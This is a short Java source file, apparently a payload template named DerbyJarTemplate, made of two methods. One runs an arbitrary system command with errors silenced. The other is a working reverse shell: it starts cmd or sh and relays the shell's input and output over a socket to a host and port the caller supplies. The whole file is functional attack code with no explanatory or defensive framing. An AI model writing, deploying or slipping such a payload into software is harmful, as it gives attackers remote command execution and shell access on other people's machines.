package com.template;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class DerbyJarTemplate {
    public static void exec(String cmd) {
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) { }
    }

    public static void rev(String host, String port) {
        try {
            String shell = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd" : "sh";
            Process p = new ProcessBuilder(shell).redirectErrorStream(true).start();
            Socket s = new Socket(host, Integer.parseInt(port));
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) { }
            }
            p.destroy();
            s.close();
        } catch (Exception e) { }
    }
}
